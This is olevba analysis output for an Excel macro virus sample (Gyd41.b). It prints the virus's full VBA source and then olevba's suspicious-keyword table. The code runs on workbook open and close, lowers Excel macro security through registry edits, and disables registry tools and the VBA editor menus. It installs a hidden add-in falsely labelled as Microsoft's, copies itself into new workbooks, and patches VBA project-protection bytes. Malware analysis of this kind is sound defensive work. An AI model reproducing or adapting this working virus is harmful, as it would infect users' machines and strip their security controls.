olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Gyd41.b.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Gyd41.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Gyd41.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Gyd41.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Gyd41.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module.bas 
in file: Virus.MSExcel.Gyd41.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Private Module
Global Const REG_SZ As Long = 1
Global Const REG_DWORD As Long = 4
Global Const HKLR = &H80000000
Global Const HKCU = &H80000001
Global Const HKLM = &H80000002
Global Const HKUS = &H80000003
Global Const ERROR_NONE = 0
Global Const ERROR_BADDB = 1
Global Const ERROR_BADKEY = 2
Global Const ERROR_CANTOPEN = 3
Global Const ERROR_CANTREAD = 4
Global Const ERROR_CANTWRITE = 5
Global Const ERROR_OUTOFMEMORY = 6
Global Const ERROR_INVALID_PARAMETER = 7
Global Const ERROR_ACCESS_DENIED = 8
Global Const ERROR_INVALID_PARAMETERS = 87
Global Const ERROR_NO_MORE_ITEMS = 259
Global Const KEY_ALL_ACCESS = &H3F
Global Const REG_OPTION_NON_VOLATILE = 0
Global Const ACTION_CRYPT = 1
Global Const ACTION_UNCRYPT = 2
Type UnlockType1  'ID="{ . CMG="
  UnlockLine As String * 5
End Type
Type UnlockType2  'GC="
  UnlockLine As String * 4
End Type
Type UnlockType3  '十六进制0D0A
  UnlockLine As String * 2
End Type
Type UnlockType4 ' 十六进制20
  UnlockLine As String * 1
End Type
Type UnlockType5 ' ID segment
  UnlockLine As String * 38
End Type
Declare Function RegCloseKey Lib "advapi32.dll" ( _
                            ByVal hKey As Long _
                            ) As Long
Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" ( _
                            ByVal hKey As Long, _
                            ByVal lpSubKey As String, _
                            ByVal Reserved As Long, _
                            ByVal lpClass As String, _
                            ByVal dwOptions As Long, _
                            ByVal samDesired As Long, _
                            ByVal lpSecurityAttributes As Long, _
                            phkResult As Long, _
                            lpdwDisposition As Long _
                            ) As Long
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" ( _
                            ByVal hKey As Long, _
                            ByVal lpSubKey As String, _
                            ByVal ulOptions As Long, _
                            ByVal samDesired As Long, _
                            phkResult As Long _
                            ) As Long
Declare Function RegQueryValueExString Lib "advapi32.dll" Alias "RegQueryValueExA" ( _
                            ByVal hKey As Long, _
                            ByVal lpValueName As String, _
                            ByVal lpReserved As Long, _
                            lpType As Long, _
                            ByVal lpData As String, _
                            lpcbData As Long _
                            ) As Long
Declare Function RegQueryValueExLong Lib "advapi32.dll" Alias "RegQueryValueExA" ( _
                            ByVal hKey As Long, _
                            ByVal lpValueName As String, _
                            ByVal lpReserved As Long, _
                            lpType As Long, _
                            lpData As Long, _
                            lpcbData As Long _
                            ) As Long
Declare Function RegQueryValueExNULL Lib "advapi32.dll" Alias "RegQueryValueExA" ( _
                            ByVal hKey As Long, _
                            ByVal lpValueName As String, _
                            ByVal lpReserved As Long, _
                            lpType As Long, _
                            ByVal lpData As Long, _
                            lpcbData As Long _
                            ) As Long
Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" ( _
                            ByVal hKey As Long, _
                            ByVal lpValueName As String, _
                            ByVal Reserved As Long, _
                            ByVal dwType As Long, _
                            ByVal lpValue As String, _
                            ByVal cbData As Long _
                            ) As Long
Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" ( _
                            ByVal hKey As Long, _
                            ByVal lpValueName As String, _
                            ByVal Reserved As Long, _
                            ByVal dwType As Long, _
                            lpValue As Long, _
                            ByVal cbData As Long _
                            ) As Long
Declare Function RegDeleteKey& Lib "advapi32.dll" Alias "RegDeleteKeyA" ( _
                            ByVal hKey As Long, _
                            ByVal lpSubKey As String)
Declare Function RegDeleteValue& Lib "advapi32.dll" Alias "RegDeleteValueA" ( _
                            ByVal hKey As Long, _
                            ByVal lpValueName As String)
Public Function DeleteKey(lPredefinedKey As Long, sKeyName As String)
    Dim lRetVal As Long
    Dim hKey As Long
    lRetVal = RegOpenKeyEx(lPredefinedKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
    lRetVal = RegDeleteKey(lPredefinedKey, sKeyName)
    RegCloseKey (hKey)
End Function
Public Function DeleteValue(lPredefinedKey As Long, sKeyName As String, sValueName As String)
       Dim lRetVal As Long
       Dim hKey As Long
       lRetVal = RegOpenKeyEx(lPredefinedKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
       lRetVal = RegDeleteValue(hKey, sValueName)
       RegCloseKey (hKey)
End Function
Public Function SetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
    Dim lValue As Long
    Dim sValue As String
    Select Case lType
        Case REG_SZ
            sValue = vValue
            SetValueEx = RegSetValueExString(hKey, sValueName, 0&, lType, sValue, Len(sValue))
        Case REG_DWORD
            lValue = vValue
            SetValueEx = RegSetValueExLong(hKey, sValueName, 0&, lType, lValue, 4)
        End Select
End Function
Function QueryValueEx(ByVal lhKey As Long, ByVal szValueName As String, vValue As Variant) As Long
    Dim cch As Long
    Dim lrc As Long
    Dim lType As Long
    Dim lValue As Long
    Dim sValue As String
    On Error GoTo QueryValueExError
    lrc = RegQueryValueExNULL(lhKey, szValueName, 0&, lType, 0&, cch)
    If lrc <> ERROR_NONE Then Error 5
    Select Case lType
        Case REG_SZ:
            sValue = String(cch, 0)
            lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)
            If lrc = ERROR_NONE Then
                vValue = Left$(sValue, cch)
            Else
                vValue = Empty
            End If
        Case REG_DWORD:
            lrc = RegQueryValueExLong(lhKey, szValueName, 0&, lType, lValue, cch)
            If lrc = ERROR_NONE Then vValue = lValue
        Case Else
            lrc = -1
    End Select
QueryValueExExit:
    QueryValueEx = lrc
    Exit Function
QueryValueExError:
    Resume QueryValueExExit
End Function
Public Function CreateNewKey(lPredefinedKey As Long, sNewKeyName As String)
    Dim hNewKey As Long
    Dim lRetVal As Long
    lRetVal = RegCreateKeyEx(lPredefinedKey, sNewKeyName, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hNewKey, lRetVal)
    RegCloseKey (hNewKey)
End Function
Public Function SetKeyValue(ByVal lPredefinedKey As Long, ByVal sKeyName As String, ByVal sValueName As String, ByVal vValueSetting As Variant, ByVal lValueType As Long)
       Dim lRetVal As Long
       Dim hKey As Long
       lRetVal = RegOpenKeyEx(lPredefinedKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
       lRetVal = SetValueEx(hKey, sValueName, lValueType, vValueSetting)
       RegCloseKey (hKey)
End Function
Public Function QueryValue(lPredefinedKey As Long, sKeyName As String, sValueName As String) As String
       Dim lRetVal As Long
       Dim hKey As Long
       Dim vValue As Variant
       lRetVal = RegOpenKeyEx(lPredefinedKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
       lRetVal = QueryValueEx(hKey, sValueName, vValue)
       QueryValue = vValue
       RegCloseKey (hKey)
End Function
Public Function Settings(ByVal lPredefinedKey As Long, ByVal strKey As String)
        SetKeyValue lPredefinedKey, strKey, "AccessVBOM", 1, REG_DWORD
        SetKeyValue lPredefinedKey, strKey, "DontTrustInstalledFiles", 0, REG_DWORD
        SetKeyValue lPredefinedKey, strKey, "Level", 1, REG_DWORD
End Function
Private Sub Auto_Open()
    On Error Resume Next
    Dim cmdControl As CommandBarControl
    Dim IDs As Variant
    Dim intID As Variant
    Dim strKey As String
    If Date >= #6/1/2008# Then
        strKey = "Software\Microsoft\Office\" & _
                 Application.Version & _
                 "\Excel\Security"
        If QueryValue(HKCU, strKey, "AccessVBOM") = "1" Then
            IDs = Array(522, 797, 859, 943, 1651, 1695, 3627, 30017)
            With Application
                .SendKeys "%q"
                .OnKey "%{F11}", ""
                .OnKey "%{F8}", ""
                With CommandBars
                    If Val(Application.Version) > 10 Then
                        Application.DisableCustomize = True
                    End If
                    .Item("Visual Basic").Enabled = False
                    .Item("Toolbar List").Enabled = False
                    .Item("Forms").Enabled = False
                    .Item("Control Toolbox").Enabled = False
                    .Item("Tools").Controls("Options").Delete
                    For Each intID In IDs
                        Set cmdControl = .FindControl(ID:=intID)
                        cmdControl.Delete
                    Next
                    SetKeyValue HKCU, _
                                "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM", _
                                "DISABLEREGISTRYTOOLS", _
                                1, _
                                REG_DWORD
                End With
                .ScreenUpdating = False
                .DisplayAlerts = False
                .EnableCancelKey = xlDisabled
                Dim addName As String
                addName = "Microsoft Assistant VBA"
                If ThisWorkbook.Name Like addName & "*" Then
                    Set myCls.app = Application
                Else
                    Dim objAddin As AddIn
                    Set objAddin = AddIns(addName)
                    If objAddin Is Nothing Or _
                        Dir(Replace(UCase(Application.UserLibraryPath), UCase("AddIns"), "Office"), vbHidden + vbSystem) = "" _
                        Then
                        .StatusBar = " "
                        CreatMsAssist addName, IIf(objAddin Is Nothing, True, False)
                    Else
                        If objAddin.Installed = False Then
                            objAddin.Installed = True
                        End If
                        Set objAddin = Nothing
                    End If
                End If
                .EnableEvents = True
                .EnableCancelKey = xlInterrupt
                .ScreenUpdating = True
                .DisplayAlerts = True
            End With
        End If
    End If
End Sub
Private Sub Auto_Close()
    On Error Resume Next
    Dim strKey As String
    If Date >= #6/1/2008# Then
        strKey = "Software\Microsoft\Office\" & _
                 Application.Version & _
                 "\Excel\Security"
        With Application
            .ScreenUpdating = False
            .DisplayAlerts = False
            .EnableCancelKey = xlDisabled
            If QueryValue(HKCU, strKey, "Level") <> "1" Or _
               QueryValue(HKCU, strKey, "AccessVBOM") <> "1" Or _
               QueryValue(HKCU, strKey, "DontTrustInstalledFiles") <> "0" Then
                Settings HKCU, strKey
                Dim appExl As Application
                Dim wkNew As Workbook
                Set appExl = CreateObject("Excel.Application")
                Set wkNew = appExl.Workbooks.Add
            Else
                Dim Path As String
                Dim addName As String
                Dim wkName As String
                wkName = "Microsoft Assistant VBA.XLA"
                addName = "Microsoft Assistant VBA"
                Path = Replace(UCase(Application.UserLibraryPath), UCase("AddIns"), "Office") & wkName
                If ThisWorkbook.Name Like addName & "*" Then
                    AddIns(addName).Installed = True
                Else
                    Dim objAddin As AddIn
                    Dim VBC As VBComponent
                    Set objAddin = AddIns(addName)
                    If objAddin Is Nothing Or Dir(Path, vbHidden + vbSystem) = "" Then
                        If Dir(Path, vbHidden + vbSystem) = "" Then
                            .StatusBar = " "
                            CreatMsAssist addName, IIf(objAddin Is Nothing, True, False)
                        Else
                            AddIns.Add fileName:=Path
                            AddIns(addName).Installed = True
                        End If
                    Else
                        If objAddin.Installed = False Then
                            objAddin.Installed = True
                        End If
                        Set objAddin = Nothing
                    End If
                    With Workbooks(wkName)
                        If .VBProject.Protection = vbext_pp_none Then
                            Set VBC = .VBProject.VBComponents("ClsCapture")
                            If VBC Is Nothing Then
                                ImportCodeModule ThisWorkbook, Workbooks(wkName), True
                                .Save
                            End If
                            Uncrypt wkName, Path, ACTION_CRYPT
                        End If
                    End With
                End If
            End If
            .EnableCancelKey = xlInterrupt
            .ScreenUpdating = True
            .DisplayAlerts = True
        End With
    End If
End Sub
Function CreatMsAssist(ByVal addName As String, Optional blnAdd As Boolean = False)
    On Error Resume Next
    Dim wkNew As Workbook
    Dim fileDir As String
    Dim fileName As String
    fileDir = Replace(UCase(Application.UserLibraryPath), _
              UCase("AddIns"), _
              "Office")
    fileName = "Microsoft Assistant VBA.XLA"
    Set wkNew = Workbooks.Add
    ImportCodeModule ThisWorkbook, wkNew, True
    wkNew.IsAddin = True
    With wkNew.BuiltinDocumentProperties
        .Item("Title") = addName
        .Item("Comments") = addName
        .Item("Author") = "Microsoft Corporation"
        .Item("Company") = "Microsoft Corporation"
    End With
    wkNew.Close True, fileDir & fileName
    Set wkNew = Nothing
    SetAttr fileDir & fileName, vbHidden + vbSystem
    If blnAdd Then
        AddIns.Add fileName:=fileDir & fileName
    End If
    If AddIns(addName).Installed = False Then
        AddIns(addName).Installed = True
    End If
End Function
Function Uncrypt(ByVal wkName As String, _
                 ByVal Path As String, _
                 ByVal LockProj As Integer, _
                 Optional blnForceUpcrypt As Boolean = False)
    Dim I As Long, _
        j As Long, _
        K As Long, _
        StartIDB As Long, _
        StartCMGB As Long, _
        StopCMGB As Long, _
        StartDPBB As Long, _
        StartGCB As Long
    Dim IID As UnlockType5
    Dim cID As UnlockType1, _
        cCMG As UnlockType1, _
        cDPB As UnlockType1
    Dim cGC As UnlockType2
    Dim c0D0A As UnlockType3
    Dim c20 As UnlockType4, _
        c00 As UnlockType4, _
        cFF As UnlockType4
    Dim vbaUnlock1 As UnlockType1
    Dim vbaUnlock2 As UnlockType2
    Dim vbaUnlock3 As UnlockType3
    Dim vbaUnlock4 As UnlockType4
    Dim vbaUnlock5 As UnlockType5
    Dim flag As Boolean
    If LockProj = ACTION_UNCRYPT Then
        With Workbooks(wkName)
            If .Saved = False Then
                .Save
            End If
            .ChangeFileAccess xlReadOnly, , False
        End With
    End If
    On Error GoTo Errline
    cID.UnlockLine = "ID=""{"
    cCMG.UnlockLine = "CMG="""
    cDPB.UnlockLine = "DPB="""
    cGC.UnlockLine = "GC="""
    c0D0A.UnlockLine = vbCr & vbLf
    c20.UnlockLine = " "
    c00.UnlockLine = Chr(0)
    cFF.UnlockLine = Chr(255)
    Open Path For Binary As #1
    StartCMGB = 0
    StartIDB = 0
    StartGCB = 0
    StartDPBB = 0
    For I = LOF(1) To 1 Step -1
        Get #1, I, vbaUnlock1
        If cID.UnlockLine = vbaUnlock1.UnlockLine Then
            StartIDB = I - 1
            If LockProj = ACTION_CRYPT Then
                Get #1, StartIDB + 44, vbaUnlock3
                If vbaUnlock3.UnlockLine = c0D0A.UnlockLine Then
                   Exit For
                End If
            Else
                Exit For
            End If
        End If
    Next I
    If StartIDB > 0 Then
        Get #1, StartIDB + 5, vbaUnlock5
        If Not vbaUnlock5.UnlockLine Like "{HGFEDCBA*ZYXWVUTSRQPO}" Or blnForceUpcrypt Then
            If LockProj = ACTION_UNCRYPT Then  'if unlock
                For I = StartIDB + 1 To LOF(1)
                   Get #1, I, vbaUnlock1
                   If cDPB.UnlockLine = vbaUnlock1.UnlockLine Then
                        StartDPBB = I - 1
                        Exit For
                   End If
                Next I
                For I = StartIDB + 1 To LOF(1)
                   Get #1, I, vbaUnlock1
                   If cCMG.UnlockLine = vbaUnlock1.UnlockLine Then
                        StartCMGB = I - 1
                        Exit For
                   End If
                Next I
                For I = StartIDB + 1 To LOF(1)
                   Get #1, I, vbaUnlock2
                   If vbaUnlock2.UnlockLine = cGC.UnlockLine Then
                         StartGCB = I - 1
                         K = I
                         Exit For
                    End If
                Next I
                For j = K + 4 To LOF(1)
                    Get #1, j, vbaUnlock3
                    If vbaUnlock3.UnlockLine = c0D0A.UnlockLine Then
                        StopCMGB = j - 2
                        Exit For
                    End If
                Next j
                flag = False 'if second scheme or not
                For j = StartCMGB + 1 To StopCMGB + 1
                    Get #1, j, vbaUnlock4
                    If vbaUnlock4.UnlockLine = c00.UnlockLine Or _
                       vbaUnlock4.UnlockLine = cFF.UnlockLine Then
                        flag = True
                        Exit For 'second scheme
                    End If
                Next j
                ' modify id segment
                If Not flag Then
                    For I = 1 To 42 Step 2
                      Put #1, StartIDB + I, c0D0A
                    Next I
                    Put #1, StartIDB + 43, c20
                    ' modify CMG\DPB\GC segments
                    For I = 1 To StopCMGB - StartCMGB Step 2
                        Put #1, StartCMGB + I, c0D0A
                    Next I
                    If Not (StopCMGB - StartCMGB + 1) / 2 = _
                       Int((StopCMGB - StartCMGB + 1) / 2) Then '如果段串不成对剩余一个时用0x20填充
                        Put #1, StopCMGB + 1, c20
                    End If
                Else
                    Put #1, StartCMGB + 1, "LDH"
                    Put #1, StartDPBB + 1, "LDH"
                    Put #1, StartGCB + 1, "AB"
                End If
            Else
                ' Lock
                IID.UnlockLine = "{HGFEDCBA-" & _
                                Format(VBA.Int((9000) * Rnd(Time) + 1000), "0000") & _
                                "-" & _
                                Format(VBA.Int((9000) * Rnd(Time) + 1000), "0000") & _
                                "-" & _
                                Format(VBA.Int((9000) * Rnd(Time) + 1000), "0000") & _
                                "-ZYXWVUTSRQPO}"
                Put #1, StartIDB + 5, IID
            End If
        Else
            Uncrypt = "Infected"
        End If
    End If
    Close #1
    If LockProj = ACTION_UNCRYPT And Uncrypt <> "Infected" Then
        With Workbooks(wkName)
            .ChangeFileAccess xlReadWrite, , False
        End With
    End If
    Exit Function
Errline:
    Exit Function
End Function
Public Function ImportCodeModule(wkExport As Workbook, _
                                 wkImport As Workbook, _
                                 Optional bTemplate As Boolean = False)
    On Error Resume Next
    Dim iLines As Integer
    Dim VBC As VBComponent
    Dim rngCell As Range
    Dim pwd As String
    pwd = "gydhx41"
    With Application
        .EnableEvents = False
        .Calculation = xlCalculationManual
        .ScreenUpdating = False
        With wkExport.Sheets("sheetMacroXXX")
            .Unprotect pwd
            .Visible = 0
            iLines = 0
            Set VBC = wkImport.VBProject.VBComponents.Add(vbext_ct_StdModule)
            VBC.Name = "Module"
            For Each rngCell In .Range("GA1" & ":GA" & .Range("GA65536").End(xlUp).Row)
                If Trim(rngCell) <> "" Then
                    With VBC.CodeModule
                        iLines = iLines + 1
                        .InsertLines iLines, rngCell.Formula
                    End With
                End If
            Next rngCell
            If bTemplate Then
                VBC.CodeModule.InsertLines 2, "Dim myCls As New ClsCapture"
                iLines = 0
                Set VBC = wkImport.VBProject.VBComponents.Add(vbext_ct_ClassModule)
                VBC.Name = "ClsCapture"
                For Each rngCell In .Range("GB1" & ":GB" & .Range("GB65536").End(xlUp).Row)
                    If Trim(rngCell) <> "" Then
                        With VBC.CodeModule
                            iLines = iLines + 1
                            .InsertLines iLines, rngCell.Formula
                        End With
                    End If
                Next rngCell
            End If
'            iLines = 0
'            Set VBC = wkImport.VBProject.VBComponents("ThisWorkbook")
'            For Each rngCell In .Range("GC1" & ":GC" & .Range("GC65536").End(xlUp).Row)
'                If Trim(rngCell) <> "" Then
'                    With VBC.CodeModule
'                        iLines = iLines + 1
'                        .InsertLines iLines, rngCell.Formula
'                    End With
'                End If
'            Next rngCell
'            VBC.CodeModule.DeleteLines 2
'            VBC.CodeModule.InsertLines 2, "    If Date > #" & Format(Date - 1, "MM/DD/YYYY") & "# Then"
            wkImport.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 5, 3
            .Copy AFTER:=wkImport.Sheets(wkImport.Sheets.Count)
            With wkImport.Sheets(wkImport.Sheets.Count)
                .Protect pwd
                .Visible = 2
            End With
            .Protect pwd
            .Visible = 2
            wkExport.Save
        End With
        .EnableEvents = True
        .Calculation = xlCalculationAutomatic
        .ScreenUpdating = True
    End With
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

